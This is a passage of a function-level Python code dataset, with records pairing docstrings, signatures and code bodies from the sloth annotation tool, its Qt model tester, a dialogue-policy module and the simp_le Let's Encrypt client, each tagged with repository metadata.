system:\n    print('WoLF-PHC ({0}) policy action encoder warning: Selecting '\n          'default action (unable to encode: {1})!'\n          .format(self.agent_role, action))\nelse:\n    print('WoLF-PHC ({0}) policy action encoder warning: Selecting '\n          'default action (unable to encode other agent action: {1})!'\n          .format(self.agent_role, action))\n\nreturn -1", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\wolf_phc_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nOverrides OptionParser._process_args to exclusively handle default\noptions and ignore args and other options.\n\nThis overrides the behavior of the super class, which stop parsing\nat the first unrecognized option.\n\"\"\"\n", "func_signal": "def _process_args(self, largs, rargs, values):\n", "code": "while rargs:\n    arg = rargs[0]\n    try:\n        if arg[0:2] == \"--\" and len(arg) > 2:\n            # process a single long option (possibly with value(s))\n            # the superclass code pops the arg off rargs\n            self._process_long_opt(rargs, values)\n        elif arg[:1] == \"-\" and len(arg) > 1:\n            # process a cluster of short options (possibly with\n            # value(s) for the last one only)\n            # the superclass code pops the arg off rargs\n            self._process_short_opts(rargs, values)\n        else:\n            # it's either a non-default option or an arg\n            # either way, add it to the args list so we can keep\n            # dealing with options\n            del rargs[0]\n            raise Exception\n    except:\n        largs.append(arg)", "path": "sloth\\core\\cli.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nSet the index of the model which denotes the current image to be\ndisplayed by the scene.  This can be either the index to a frame in a\nvideo, or to an image.\n\"\"\"\n", "func_signal": "def setCurrentImage(self, current_image):\n", "code": "if current_image == self._image_item:\n    return\nelif current_image is None:\n    self.clear()\n    self._image_item = None\n    self._image      = None\n    self._pixmap     = None\nelse:\n    self.clear()\n    self._image_item = current_image\n    current_image._seen = True\n    assert self._image_item.model() == self._model\n    self._image      = self._labeltool.getImage(self._image_item)\n    self._pixmap     = QPixmap(toQImage(self._image))\n    self._scene_item = QGraphicsPixmapItem(self._pixmap)\n    self._scene_item.setZValue(-1)\n    self.setSceneRect(0, 0, self._pixmap.width(), self._pixmap.height())\n    self.addItem(self._scene_item)\n\n    self.insertItems(0, len(self._image_item.children())-1)\n    self.update()", "path": "sloth\\gui\\annotationscene.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nTests self.model's implementation of QtCore.QAbstractItemModel::columnCount() and hasChildren()\n\"\"\"\n# check top row\n", "func_signal": "def columnCount(self):\n", "code": "topidx = self.model.index(0,0,QtCore.QModelIndex())\nassert(self.model.columnCount(topidx) >= 0)\n\n# check a column count where parent is valid\nchildidx = self.model.index(0,0,topidx)\nif childidx.isValid() :\n    assert(self.model.columnCount(childidx) >= 0)\n\n# columnCount() is tested more extensively in checkChildren,\n# but this catches the big mistakes", "path": "tests\\pymodeltest\\modeltest.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nPrint the help message for this command, derived from\n``self.usage()``.\n\"\"\"\n", "func_signal": "def print_help(self, prog_name, subcommand):\n", "code": "parser = self.create_parser(prog_name, subcommand)\nparser.print_help()", "path": "sloth\\core\\cli.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "# Abort current inserter\n", "func_signal": "def onInsertionModeStarted(self, label_class):\n", "code": "if self._inserter is not None:\n    self._inserter.abort()\n\nself.deselectAllItems()\n\n# Add new inserter\ndefault_properties = self._labeltool.propertyeditor().currentEditorProperties()\ninserter = self._inserterfactory.create(label_class, self._labeltool, self, default_properties)\nif inserter is None:\n    raise InvalidArgumentException(\"Could not find inserter for class '%s' with default properties '%s'\" % (label_class, default_properties))\ninserter.inserterFinished.connect(self.onInserterFinished)\nself._labeltool.currentImageChanged.connect(inserter.imageChange)\nself._inserter = inserter\nLOG.debug(\"Created inserter for class '%s' with default properties '%s'\" % (label_class, default_properties))\n# Change cursor to cross\nself.views()[0].viewport().setCursor(Qt.CrossCursor)", "path": "sloth\\gui\\annotationscene.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nConfirm that what was said was going to happen actually did\n\"\"\"\n", "func_signal": "def rowsRemoved(self, parent, start, end):\n", "code": "c = self.remove.pop()\nassert(c['parent'] == parent)\nassert(c['oldSize'] - (end - start + 1) == self.model.rowCount(parent))\nassert(c['last'] == self.model.data(self.model.index(start-1, 0, c['parent'])))\nassert(c['next'] == self.model.data(self.model.index(start, 0, c['parent'])))", "path": "tests\\pymodeltest\\modeltest.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nReturn a brief description of how to use this command, by\ndefault from the attribute ``self.help``.\n\"\"\"\n", "func_signal": "def usage(self, subcommand):\n", "code": "usage = '%%prog %s [options] %s' % (subcommand, self.args)\nif self.help:\n    return '%s\\n\\n%s' % (usage, self.help)\nelse:\n    return usage", "path": "sloth\\core\\cli.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nConfirm that what was said was going to happen actually did\n\"\"\"\n", "func_signal": "def rowsInserted(self, parent, start, end):\n", "code": "c = self.insert.pop()\nassert(c['parent'] == parent)\nassert(c['oldSize'] + (end - start + 1) == self.model.rowCount(parent))\nassert(c['last'] == self.model.data(self.model.index(start-1, 0, c['parent'])))\n\n# if c['next'] != self.model.data(self.model.index(end+1, 0, c['parent'])):\n#   qDebug << start << end\n#   for i in range(0, self.model.rowCount(QtCore.QModelIndex())):\n#       qDebug << self.model.index(i, 0).data().toString()\n#   qDebug() << c['next'] << self.model.data(self.model.index(end+1, 0, c['parent']))\n\nassert(c['next'] == self.model.data(self.model.index(end+1, 0, c['parent'])))", "path": "tests\\pymodeltest\\modeltest.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "# disable inserting\n# TODO: forward this to the ButtonArea\n", "func_signal": "def selectNextItem(self, reverse=False):\n", "code": "self._inserter = None\n\n# set focus to the view, so that subsequent keyboard events are forwarded to the scene\nif len(self.views()) > 0:\n    self.views()[0].setFocus(True)\n\n# get the current selected item if there is any\nselected_item = None\nfound = True\nif len(self.selectedItems()) > 0:\n    selected_item = self.selectedItems()[0]\n    selected_item.setSelected(False)\n    found = False\n\nitems = [item for item in self.items()\n         if item.flags() & QGraphicsItem.ItemIsSelectable] * 2\nif reverse:\n    items.reverse()\n\nfor item in items:\n    if item is selected_item:\n        found = True\n        continue\n\n    if found and item is not selected_item:\n        item.setSelected(True)\n        break", "path": "sloth\\gui\\annotationscene.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "# calculate font size\n", "func_signal": "def enumerateCorners(self):\n", "code": "fontsize = (self._pixmap.width()+self._pixmap.height())/150\n\n# decorate the paint() method with our enumerating paint\nself.enumeratePolygonItems(fontsize)\nself.enumerateRectItems(fontsize)\n\nself.reset()", "path": "sloth\\gui\\annotationscene.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nStore what is about to be inserted to make sure it actually happens\n\"\"\"\n", "func_signal": "def rowsAboutToBeInserted(self, parent, start, end):\n", "code": "c = {}\nc['parent'] = parent\nc['oldSize'] = self.model.rowCount(parent)\nc['last'] = self.model.data(self.model.index(start-1, 0, parent))\nc['next'] = self.model.data(self.model.index(start, 0, parent))\nself.insert.append(c)", "path": "tests\\pymodeltest\\modeltest.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "# do not use QGraphicsScene.clear(self) so that the underlying\n# C++ objects are not deleted if there is still another python\n# reference to the item somewhere else (e.g. in an inserter)\n", "func_signal": "def clear(self):\n", "code": "for item in self.items():\n    if item.parentItem() is None:\n        self.removeItem(item)\nself._scene_item = None", "path": "sloth\\gui\\annotationscene.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nStore what is about to be inserted to make sure it actually happens\n\"\"\"\n", "func_signal": "def rowsAboutToBeRemoved(self, parent, start, end):\n", "code": "c = {}\nc['parent'] = parent\nc['oldSize'] = self.model.rowCount(parent)\nc['last'] = self.model.data(self.model.index(start-1, 0, parent))\nc['next'] = self.model.data(self.model.index(end+1, 0, parent))\nself.remove.append(c)", "path": "tests\\pymodeltest\\modeltest.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nTests self.model's implementation of QtCore.QAbstractItemModel::rowCount() and hasChildren()\n\nself.models that are dynamically populated are not as fully tested here.\n\"\"\"\n# check top row\n", "func_signal": "def rowCount(self):\n", "code": "topindex = self.model.index(0,0,QtCore.QModelIndex())\nrows = self.model.rowCount(topindex)\nassert(rows >= 0)\nif rows > 0:\n    assert(self.model.hasChildren(topindex) == True )\n\nsecondlvl = self.model.index(0,0,topindex)\nif secondlvl.isValid():\n    # check a row count where parent is valid\n    rows = self.model.rowCount(secondlvl)\n    assert(rows >= 0)\n    if rows > 0:\n        assert(self.model.hasChildren(secondlvl) == True)\n\n# The self.models rowCount() is tested more extensively in checkChildren,\n# but this catches the big mistakes", "path": "tests\\pymodeltest\\modeltest.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nnonDestructiveBasicTest tries to call a number of the basic functions (not all)\nto make sure the model doesn't outright segfault, testing the functions that makes sense.\n\"\"\"\n", "func_signal": "def nonDestructiveBasicTest(self):\n", "code": "assert(self.model.buddy(QtCore.QModelIndex()) == QtCore.QModelIndex())\nself.model.canFetchMore(QtCore.QModelIndex())\nassert(self.model.columnCount(QtCore.QModelIndex()) >= 0)\nassert(self.model.data(QtCore.QModelIndex(), QtCore.Qt.DisplayRole) == QtCore.QVariant())\nself.fetchingMore = True\nself.model.fetchMore(QtCore.QModelIndex())\nself.fetchingMore = False\nflags = self.model.flags(QtCore.QModelIndex())\nassert( int(flags & QtCore.Qt.ItemIsEnabled) == QtCore.Qt.ItemIsEnabled or int(flags & QtCore.Qt.ItemIsEnabled ) == 0 )\nself.model.hasChildren(QtCore.QModelIndex())\nself.model.hasIndex(0,0)\nself.model.headerData(0,QtCore.Qt.Horizontal, QtCore.Qt.DisplayRole)\nself.model.index(0,0, QtCore.QModelIndex())\nself.model.itemData(QtCore.QModelIndex())\ncache = QtCore.QVariant()\nself.model.match(QtCore.QModelIndex(), -1, cache)\nself.model.mimeTypes()\nassert(self.model.parent(QtCore.QModelIndex()) == QtCore.QModelIndex())\nassert(self.model.rowCount(QtCore.QModelIndex()) >= 0)\nvariant = QtCore.QVariant()\nself.model.setData(QtCore.QModelIndex(), variant, -1)\nself.model.setHeaderData(-1, QtCore.Qt.Horizontal, QtCore.QVariant())\nself.model.setHeaderData(0, QtCore.Qt.Horizontal, QtCore.QVariant())\nself.model.setHeaderData(999999, QtCore.Qt.Horizontal, QtCore.QVariant())\nself.model.sibling(0,0,QtCore.QModelIndex())\nself.model.span(QtCore.QModelIndex())\nself.model.supportedDropActions()", "path": "tests\\pymodeltest\\modeltest.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nCreate and return the ``OptionParser`` which will be used to\nparse the arguments to this command.\n\"\"\"\n", "func_signal": "def create_parser(self, prog_name, subcommand):\n", "code": "return OptionParser(prog=prog_name,\n                    usage=self.usage(subcommand),\n                    version=self.get_version(),\n                    option_list=self.option_list)", "path": "sloth\\core\\cli.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nCalled from parent() test.\n\nA self.model that returns an index of parent X should also return X when asking\nfor the parent of the index\n\nThis recursive function does pretty extensive testing on the whole self.model in an\neffort to catch edge cases.\n\nThis function assumes that rowCount(QtCore.QModelIndex()), columnCount(QtCore.QModelIndex()) and index() already work.\nIf they have a bug it will point it out, but the above tests should have already\nfound the basic bugs because it is easier to figure out the problem in\nthose tests then this one\n\"\"\"\n# First just try walking back up the tree.\n", "func_signal": "def checkChildren(self, parent, depth = 0):\n", "code": "p = parent;\nwhile p.isValid():\n    p = p.parent()\n\n#For self.models that are dynamically populated\nif self.model.canFetchMore( parent ):\n    self.fetchingMore = True\n    self.model.fetchMore(parent)\n    self.fetchingMore = False\n\nrows = self.model.rowCount(parent)\ncols = self.model.columnCount(parent)\n\nif rows > 0:\n    assert(self.model.hasChildren(parent))\n\n# Some further testing against rows(), columns, and hasChildren()\nassert( rows >= 0 )\nassert( cols >= 0 )\n\nif rows > 0:\n    assert(self.model.hasChildren(parent) == True)\n\n# qDebug() << \"parent:\" << self.model.data(parent).toString() << \"rows:\" << rows\n#          << \"columns:\" << cols << \"parent column:\" << parent.column()\n\nassert( self.model.hasIndex( rows+1, 0, parent) == False)\nfor r in range(0,rows):\n    if self.model.canFetchMore(parent):\n        self.fetchingMore = True\n        self.model.fetchMore(parent)\n        self.fetchingMore = False\n    assert(self.model.hasIndex(r,cols+1,parent) == False)\n    for c in range(0,cols):\n        assert(self.model.hasIndex(r,c,parent))\n        index = self.model.index(r,c,parent)\n        # rowCount(QtCore.QModelIndex()) and columnCount(QtCore.QModelIndex()) said that it existed...\n        assert(index.isValid() == True)\n\n        # index() should always return the same index when called twice in a row\n        modIdx = self.model.index(r,c,parent)\n        assert(index == modIdx)\n\n        # Make sure we get the same index if we request it twice in a row\n        a = self.model.index(r,c,parent)\n        b = self.model.index(r,c,parent)\n        assert( a == b )\n\n        # Some basic checking on the index that is returned\n        assert( index.model() == self._model )\n        assert( index.row() == r )\n        assert( index.column() == c )\n        # While you can technically return a QtCore.QVariant usually this is a sign\n        # if an bug in data() Disable if this really is ok in your self.model\n        assert( self.model.data(index, QtCore.Qt.DisplayRole).isValid() == True )\n\n        #if the next test fails here is some somehwat useful debug you play with\n        # if self.model.parent(index) != parent:\n        #   qDebug() << r << c << depth << self.model.data(index).toString()\n        #        << self.model.data(parent).toString()\n        #   qDebug() << index << parent << self.model.parent(index)\n        #   # And a view that you can even use to show the self.model\n        #   # view = QtGui.QTreeView()\n        #   # view.setself.model(model)\n        #   # view.show()\n        #\n\n        # Check that we can get back our real parent\n        p = self.model.parent( index )\n        assert( self.model.parent( index ) == parent )\n\n        # recursively go down the children\n        if self.model.hasChildren(index) and depth < 10:\n            # qDebug() << r << c << \"hasChildren\" << self.model.rowCount(index)\n            self.checkChildren(index, ++depth)\n        #else:\n        #   if depth >= 10:\n        #       qDebug() << \"checked 10 deep\"\n\n        # Make sure that after testing the children that the index doesn't change\n        newIdx = self.model.index(r,c,parent)\n        assert(index == newIdx)", "path": "tests\\pymodeltest\\modeltest.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nTests self.model's implementation of QtCore.QAbstractItemModel::data()\n\"\"\"\n# Invalid index should return an invalid qvariant\n", "func_signal": "def data(self):\n", "code": "assert( not self.model.data(QtCore.QModelIndex(), QtCore.Qt.DisplayRole).isValid())\n\nif self.model.rowCount(QtCore.QModelIndex()) == 0:\n    return\n\n# A valid index should have a valid QtCore.QVariant data\nassert( self.model.index(0,0, QtCore.QModelIndex()).isValid())\n\n# shouldn't be able to set data on an invalid index\nassert( self.model.setData( QtCore.QModelIndex(), QtCore.QVariant(\"foo\"), QtCore.Qt.DisplayRole) == False)\n\n# General Purpose roles that should return a QString\nvariant = self.model.data(self.model.index(0,0,QtCore.QModelIndex()), QtCore.Qt.ToolTipRole)\nif variant.isValid():\n    assert( variant.canConvert( QtCore.QVariant.String ) )\nvariant = self.model.data(self.model.index(0,0,QtCore.QModelIndex()), QtCore.Qt.StatusTipRole)\nif variant.isValid():\n    assert( variant.canConvert( QtCore.QVariant.String ) )\nvariant = self.model.data(self.model.index(0,0,QtCore.QModelIndex()), QtCore.Qt.WhatsThisRole)\nif variant.isValid():\n    assert( variant.canConvert( QtCore.QVariant.String ) )\n\n# General Purpose roles that should return a QSize\nvariant = self.model.data(self.model.index(0,0,QtCore.QModelIndex()), QtCore.Qt.SizeHintRole)\nif variant.isValid():\n    assert( variant.canConvert( QtCore.QVariant.Size ) )\n\n# General Purpose roles that should return a QFont\nvariant = self.model.data(self.model.index(0,0,QtCore.QModelIndex()), QtCore.Qt.FontRole)\nif variant.isValid():\n    assert( variant.canConvert( QtCore.QVariant.Font ) )\n\n# Check that the alignment is one we know about\nvariant = self.model.data(self.model.index(0,0,QtCore.QModelIndex()), QtCore.Qt.TextAlignmentRole)\nif variant.isValid():\n    alignment = variant.toInt()[0]\n    assert( alignment == (alignment & int(QtCore.Qt.AlignHorizontal_Mask | QtCore.Qt.AlignVertical_Mask)))\n\n# General Purpose roles that should return a QColor\nvariant = self.model.data(self.model.index(0,0,QtCore.QModelIndex()), QtCore.Qt.BackgroundColorRole)\nif variant.isValid():\n    assert( variant.canConvert( QtCore.QVariant.Color ) )\nvariant = self.model.data(self.model.index(0,0,QtCore.QModelIndex()), QtCore.Qt.TextColorRole)\nif variant.isValid():\n    assert( variant.canConvert( QtCore.QVariant.Color ) )\n\n# Check that the \"check state\" is one we know about.\nvariant = self.model.data(self.model.index(0,0,QtCore.QModelIndex()), QtCore.Qt.CheckStateRole)\nif variant.isValid():\n    state = variant.toInt()[0]\n    assert( state == QtCore.Qt.Unchecked or\n        state == QtCore.Qt.PartiallyChecked or\n        state == QtCore.Qt.Checked )", "path": "tests\\pymodeltest\\modeltest.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nTests self.model's implementation of QtCore.QAbstractItemModel::index()\n\"\"\"\n# Make sure that invalid values returns an invalid index\n", "func_signal": "def index(self):\n", "code": "assert(self.model.index(-2,-2, QtCore.QModelIndex()) == QtCore.QModelIndex())\nassert(self.model.index(-2,0, QtCore.QModelIndex()) == QtCore.QModelIndex())\nassert(self.model.index(0,-2, QtCore.QModelIndex()) == QtCore.QModelIndex())\n\nrows = self.model.rowCount(QtCore.QModelIndex())\ncols = self.model.columnCount(QtCore.QModelIndex())\n\nif rows == 0:\n    return\n\n# Catch off by one errors\nassert(self.model.index(rows,cols, QtCore.QModelIndex()) == QtCore.QModelIndex())\nassert(self.model.index(0,0, QtCore.QModelIndex()).isValid() == True)\n\n# Make sure that the same index is *always* returned\na = self.model.index(0,0, QtCore.QModelIndex())\nb = self.model.index(0,0, QtCore.QModelIndex())\nassert(a==b)\n\n# index() is tested more extensively in checkChildren()\n# but this catches the big mistakes", "path": "tests\\pymodeltest\\modeltest.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"\nTry to execute this command, performing model validation if\nneeded (as controlled by the attribute\n``self.requires_model_validation``). If the command raises a\n``CommandError``, intercept it and print it sensibly to\nstderr.\n\"\"\"\n", "func_signal": "def execute(self, *args, **options):\n", "code": "try:\n    self.stdout = options.get('stdout', sys.stdout)\n    self.stderr = options.get('stderr', sys.stderr)\n    output = self.handle(*args, **options)\n    if output:\n        self.stdout.write(output)\nexcept CommandError as e:\n    self.stderr.write('Error: %s\\n' % e)\n    sys.exit(1)", "path": "sloth\\core\\cli.py", "repo_name": "cvhciKIT/sloth", "stars": 605, "license": "other", "language": "python", "size": 1835}
{"docstring": "\"\"\"Run a specific test suite.\"\"\"\n", "func_signal": "def test_suite(args, suite):\n", "code": "return EXIT_TESTS_OK if unittest.TextTestRunner(\n    verbosity=(2 if args.verbose else 1)).run(\n        suite).wasSuccessful() else EXIT_ERROR", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Generate a private key.\n\n>>> gen_pkey(1024)\n<OpenSSL.crypto.PKey object at 0x...>\n\nArgs:\n  bits: Bit size of the key.\n\nReturns:\n  Freshly generated private key.\n\"\"\"\n", "func_signal": "def gen_pkey(bits):\n", "code": "assert bits >= 1024  # XXX\npkey = OpenSSL.crypto.PKey()\npkey.generate_key(OpenSSL.crypto.TYPE_RSA, bits)\nreturn pkey", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Load certificate.\"\"\"\n", "func_signal": "def load_cert(self, data):\n", "code": "return jose.ComparableX509(OpenSSL.crypto.load_certificate(\n    self.typ, data))", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Decode vhost.\n\n>>> Vhost.decode('example.com')\nVhost(name='example.com', root=None)\n>>> Vhost.decode('example.com:/var/www/html')\nVhost(name='example.com', root='/var/www/html')\n>>> Vhost.decode(Vhost(name='example.com', root=None))\nVhost(name='example.com', root=None)\n\"\"\"\n", "func_signal": "def decode(cls, data):\n", "code": "if isinstance(data, cls):\n    return data\nparts = data.split(cls._SEP, 1)\nparts.append(None)\nreturn cls(name=parts[0], root=parts[1])", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Is the existing cert data valid for enough time?\n\nIf provided certificate is `None`, then always return True:\n\n>>> valid_existing_cert(cert=None, vhosts=[], valid_min=0)\nFalse\n\n>>> cert = jose.ComparableX509(crypto_util.gen_ss_cert(\n...     gen_pkey(1024), ['example.com'], validity=(60 *60)))\n\nReturn True iff `valid_min` is not bigger than certificate lifespan:\n\n>>> valid_existing_cert(cert, [Vhost.decode('example.com')], 0)\nTrue\n>>> valid_existing_cert(cert, [Vhost.decode('example.com')], 60 * 60 + 1)\nFalse\n\nIf SANs mismatch return False no matter if expiring or not:\n\n>>> valid_existing_cert(cert, [Vhost.decode('example.net')], 0)\nFalse\n>>> valid_existing_cert(cert, [Vhost.decode('example.org')], 60 * 60 + 1)\nFalse\n\"\"\"\n", "func_signal": "def valid_existing_cert(cert, vhosts, valid_min):\n", "code": "if cert is None:\n    return False  # no existing certificate\nelse:  # renew existing?\n    new_sans = [vhost.name for vhost in vhosts]\n    existing_sans = pyopenssl_cert_or_req_san(cert.wrapped)\n    logger.debug('Existing SANs: %r, new: %r', existing_sans, new_sans)\n    return (set(existing_sans) == set(new_sans) and\n            not renewal_necessary(cert, valid_min))", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Dump JWK as PEM.\"\"\"\n", "func_signal": "def dump_pem_jwk(data):\n", "code": "return data.key.private_bytes(\n    encoding=serialization.Encoding.PEM,\n    format=serialization.PrivateFormat.TraditionalOpenSSL,\n    encryption_algorithm=serialization.NoEncryption(),\n).strip()", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Dump entry points database.\n\nCompile a database by going through all entry points registered by\ndistributions listed in `distribution_names`. Serialize database to\nJSON and dump to a file (located in `tmp_entry_points_path`) that\ncan be later copied to the one-folder/one-file distribution and used\nby `rthook-entrypoints.iter_entry_points`.\n\n\"\"\"\n", "func_signal": "def dump_entry_points(tmp_entry_points_path, *distribution_names):\n", "code": "entry_points = collections.defaultdict(collections.defaultdict)\nfor name in distribution_names:\n    entry_map = pkg_resources.get_distribution(name).get_entry_map()\n    for group, eps in entry_map.iteritems():\n        entry_points[group][name] = [str(ep) for ep in eps.itervalues()]\nwith open(tmp_entry_points_path, 'w') as fp:\n    fp.write(json.dumps(entry_points))\nreturn entry_points", "path": "pyi\\entrypoints.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Load tests which subclass from specific test case class.\"\"\"\n", "func_signal": "def load_tests_from_subclass(self, subcls):\n", "code": "module = __import__(__name__)\nreturn self.suiteClass([\n    self.loadTestsFromTestCase(getattr(module, attr))\n    for attr in dir(module)\n    if isinstance(getattr(module, attr), type) and\n    issubclass(getattr(module, attr), subcls)])", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Assert raises that tests exception message against regexp.\"\"\"\n", "func_signal": "def assert_raises_regexp(self, exc, regexp, func, *args, **kwargs):\n", "code": "with self.assert_raises(exc) as context:\n    func(*args, **kwargs)\nmsg = str(context.error)\nself.assertTrue(re.match(regexp, msg) is not None,\n                \"Exception message (%s) doesn't match \"\n                \"regexp (%s)\" % (msg, regexp))", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Load JWK encoded as PEM.\"\"\"\n", "func_signal": "def load_pem_jwk(data):\n", "code": "return jose.JWKRSA(key=serialization.load_pem_private_key(\n    data, password=None, backend=default_backend()))", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Setup basic logging.\"\"\"\n", "func_signal": "def setup_logging(verbose):\n", "code": "level = logging.DEBUG if verbose else logging.INFO\nroot_logger = logging.getLogger()\nroot_logger.setLevel(level)\nhandler = logging.StreamHandler()\nhandler.setLevel(level)\nformatter = logging.Formatter(\n    fmt='%(asctime)s:%(levelname)s:%(name)s:%(lineno)d: %(message)s',\n)\nformatter.converter = time.gmtime  # UTC instead of localtime\nhandler.setFormatter(formatter)\nroot_logger.addHandler(handler)", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Get SHA256 of URI contents.\n\n>>> with mock.patch('requests.get') as mock_get:\n...     sha256_of_uri_contents('https://example.com')\n'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'\n\"\"\"\n", "func_signal": "def sha256_of_uri_contents(uri, chunk_size=10):\n", "code": "h = hashlib.sha256()  # pylint: disable=invalid-name\nresponse = requests.get(uri, stream=True)\nfor chunk in response.iter_content(chunk_size):\n    h.update(chunk)\nreturn h.hexdigest()", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Do plugins cover all components (key/cert/chain)?\"\"\"\n", "func_signal": "def check_plugins_persist_all(ioplugins):\n", "code": "persisted = IOPlugin.Data(\n    account_key=False, key=False, cert=False, chain=False)\nfor plugin_name in ioplugins:\n    persisted = IOPlugin.Data(*componentwise_or(\n        persisted, IOPlugin.registered[plugin_name].persisted()))\n\nnot_persisted = set([\n    component\n    for component, persist in six.iteritems(persisted._asdict())\n    if not persist])\nif not_persisted:\n    raise Error('Selected IO plugins do not cover the following '\n                'components: %s.' % ', '.join(not_persisted))", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Call the external script to retrieve persisted data.\"\"\"\n", "func_signal": "def load(self):\n", "code": "pems = list(split_pems(self.get_output_or_fail('load')))\nif not pems:\n    return self.EMPTY_DATA\npersisted = self.persisted()\n\naccount_key = load_pem_jwk(\n    pems.pop(0)) if persisted.account_key else None\nkey = self.load_key(pems.pop(0)) if persisted.key else None\ncert = self.load_cert(pems.pop(0)) if persisted.cert else None\nchain = ([self.load_cert(cert_data) for cert_data in pems]\n         if persisted.chain else None)\nreturn self.Data(account_key=account_key, key=key,\n                 cert=cert, chain=chain)", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Issue and persist new key/cert/chain.\"\"\"\n", "func_signal": "def persist_new_data(args, existing_data):\n", "code": "roots = compute_roots(args.vhosts, args.default_root)\nlogger.debug('Computed roots: %r', roots)\n\nclient = registered_client(args, existing_data.account_key)\n\nauthorizations = dict(\n    (vhost.name, client.request_domain_challenges(\n        vhost.name, new_authzr_uri=client.directory.new_authz))\n    for vhost in args.vhosts\n)\nif any(supported_challb(auth) is None\n       for auth in six.itervalues(authorizations)):\n    raise Error('CA did not offer http-01-only challenge combo. '\n                'This client is unable to solve any other challenges.')\n\nfor name, auth in six.iteritems(authorizations):\n    challb = supported_challb(auth)\n    response, validation = challb.response_and_validation(client.key)\n    save_validation(roots[name], challb, validation)\n\n    verified = response.simple_verify(\n        challb.chall, name, client.key.public_key())\n    if not verified:\n        logger.warning('%s was not successfully self-verified. '\n                       'CA is likely to fail as well!', name)\n    else:\n        logger.info('%s was successfully self-verified', name)\n\n    client.answer_challenge(challb, response)\n\nif args.reuse_key and existing_data.key is not None:\n    logger.info('Reusing existing certificate private key')\n    key = existing_data.key\nelse:\n    logger.info('Generating new certificate private key')\n    key = ComparablePKey(gen_pkey(args.cert_key_size))\ncsr = gen_csr(key.wrapped, [vhost.name.encode() for vhost in args.vhosts])\ncertr = get_certr(client, csr, authorizations)\npersist_data(args, existing_data, new_data=IOPlugin.Data(\n    account_key=client.key, key=key,\n    cert=certr.body, chain=client.fetch_chain(certr)))", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
